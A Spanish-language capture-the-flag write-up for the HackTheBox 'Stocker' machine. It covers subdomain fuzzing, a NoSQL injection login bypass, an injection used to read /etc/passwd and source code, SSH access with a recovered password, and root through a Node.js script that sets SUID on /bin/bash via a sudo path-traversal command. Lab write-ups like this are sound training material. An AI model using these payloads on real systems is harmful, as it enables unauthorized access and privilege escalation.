# StockerWriteup

Realizamos un escaneo con nmap

![imagen](https://github.com/Hamibubu/Writeups/blob/main/StockerWriteup/Pasted%20image%2020230131185621.png?raw=true)

Vemos que esta abierto el puerto 80 y el 22, así que visitamos la página web, al entrar se autodirecciona a "stocker.htb", por lo que agregamos esto a /etc/hosts

Entramos y la página web no tiene nada, analizamos todo y parece segura, pero falta algo, como nos redireccionó, puede haber más subdominios escondidos así que usamos ffuf

![imagen](https://github.com/Hamibubu/Writeups/blob/main/StockerWriteup/Pasted%20image%2020230131190837.png?raw=true)

~~~
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://stocker.htb -H 'Host: FUZZ.stocker.htb' -mc 200,201,302
~~~

Entramos a página "dev.stocker.htb"

Vemos un login

![imagen](https://github.com/Hamibubu/Writeups/blob/main/StockerWriteup/Pasted%20image%2020230131191855.png?raw=true)

Calamos son SQLinjection y vemos que no funciona, calamos con noSQL

Cambiamos el formato a json y ponemos la inyección en json

~~~
{"username": {"$ne": null}, "password": {"$ne": null}}
~~~

![imagen](https://github.com/Hamibubu/Writeups/blob/main/StockerWriteup/Pasted%20image%2020230131192141.png?raw=true)

Y funciona, ahora vemos que hay una serie de productos, agregamos al carro y subimos la peticion

Si injecto texto en el json se queda

![imagen](https://github.com/Hamibubu/Writeups/blob/main/StockerWriteup/Pasted%20image%2020230131192418.png?raw=true)

Inyectamos para que nos de el etc passw, porque parece que con wrappers podemos traer archivos de un carrito

![imagen](https://github.com/Hamibubu/Writeups/blob/main/StockerWriteup/Pasted%20image%2020230131192613.png?raw=true)

Sabemos que hay un user angoose

ahora podemos ver las files que hay en /var/www/dev a ver si hay algo sobre como revisa los logins

Vemos /var/www/dev/index.js y sale

![imagen](https://github.com/Hamibubu/Writeups/blob/main/StockerWriteup/Pasted%20image%2020230131192936.png?raw=true)

Encontramos la contraseña del user

Entramos por ssh y tenemos la flag

Ahora para el root damos sudo -l

![imagen](https://github.com/Hamibubu/Writeups/blob/main/StockerWriteup/Pasted%20image%2020230131193126.png?raw=true)

Se puede ver que el usuario puede ejecutar sudo con node en la carpeta indicada para cualquier archivo js, sin importar lo que siga por la comilla

Ahora con esto creamos un script para que nos regrese una terminal con root

~~~
const { exec } = require("child_process");

exec("chmod u+s /bin/bash", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
~~~

Ahora lo ejecutamos

~~~
sudo node /usr/local/scripts/../../../home/angoose/exploit.js 
~~~

Y con esto tenemos root

![imagen](https://github.com/Hamibubu/Writeups/blob/main/StockerWriteup/Pasted%20image%2020230131193442.png?raw=true)

Listo!
